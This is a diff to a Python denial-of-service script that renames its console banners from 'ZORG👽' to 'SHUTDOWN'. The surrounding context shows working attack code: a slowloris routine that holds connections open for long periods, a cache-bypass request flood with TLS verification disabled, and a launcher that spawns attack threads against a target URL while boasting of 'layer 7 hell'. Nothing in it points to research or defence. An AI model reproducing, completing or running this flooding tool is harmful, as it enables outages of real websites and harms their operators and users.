@@ -37,7 +37,7 @@ slowloris_headers = {
     "Connection": "keep-alive",
     "Keep-Alive": "900",
     "Content-Length": "1000000",
-    "X-a": f"ZORG-{random.randint(1, 999999)}"
+    "X-a": f"SHUTDOWN-{random.randint(1, 999999)}"
 }
 
 # --- HTTP/2 FLOOD (if supported) ---
@@ -72,7 +72,7 @@ def cache_bypass_flood():
             url = f"{TARGET_URL}{payload}"
             headers = random.choice(headers_list)
             requests.get(url, headers=headers, verify=False, timeout=5)
-            print(f"[ZORG👽] CACHE BYPASS HIT: {url}")
+            print(f"[SHUTDOWN] CACHE BYPASS HIT: {url}")
         except:
             pass
         time.sleep(REQUEST_DELAY)
@@ -84,14 +84,14 @@ def slowloris_attack():
         try:
             s = requests.Session()
             s.get(TARGET_URL, headers=slowloris_headers, stream=True, timeout=1000)
-            print(f"[ZORG👽] SLOWLORIS CONNECTION OPEN: {TARGET_URL}")
+            print(f"[SHUTDOWN] SLOWLORIS CONNECTION OPEN: {TARGET_URL}")
             time.sleep(1000)  # Keep connection open as long as possible
         except:
             pass
 
 # --- MAIN ATTACK ---
 def start_attack():
-    print(f"[ZORG👽] UNLEASHING LAYER 7 HELL ON {TARGET_URL}!")
+    print(f"[SHUTDOWN] UNLEASHING LAYER 7 HELL ON {TARGET_URL}!")
     for _ in range(THREAD_COUNT // 3):
         threading.Thread(target=http2_flood).start()
         threading.Thread(target=cache_bypass_flood).start()
@@ -100,3 +100,4 @@ def start_attack():
 # --- RUN ---
 if __name__ == "__main__":
     start_attack()
+
